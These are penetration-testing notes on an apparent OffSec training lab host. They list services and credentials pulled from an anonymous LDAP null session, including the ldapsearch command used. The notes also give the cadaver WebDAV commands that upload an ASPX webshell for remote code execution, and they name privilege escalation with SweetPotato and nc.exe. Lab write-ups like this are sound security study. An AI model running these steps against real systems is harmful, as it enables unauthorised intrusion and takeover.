### ++ Approach 192.168.250.122 ++
#### Credentials
	* fmcsorley:CrabSharkJellyfish192

#### Services
	##### 53 DNS
		Domain: hutch.offsec
        DC: HUTCHDC.hutch.offsec

	##### 53 DNS
		Kerbrute:
			admin@hutch.offsec

	##### 80 Http
		After retrieve fmcsorley credentials we can upload a shell using **[cadaver](https://github.com/notroj/cadaver)**

	##### 135 RPC
		-

	##### 139,445 SMB
		-

	##### 389,3268 Ldap
		Null session that can retrieve fmcsorley credentials and other usernames

	##### 5985 WinRM
		-

### ++ Vulnerabilities ++

#### Vuln 1: Null session in ldap and sensitive information in there ++
	* With ldapsearch we can retrieve users and some info, as fmcsorley:CrabSharkJellyfish192 credentials
	* Command: ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.214.122" "(objectclass=*)"

### ++ System Interaction ++
#### Foothold as iis apppool\defaultapppool
	* With cadaver we can upload a webshell in IIS service and get RCE
	* Commands: 
		cadaver http://hutch.offsec
		user: fmcsorley
		password: CrabSharkJellyfish192

		dav:/> put /usr/share/webshells/aspx/cmdasp.aspx

	* RCE: http://hutch.offsec/cmdasp.aspx

#### Privilege Escalation 
	* Abuse SeImpersonatePrivilege with SweetPotato and nc.exe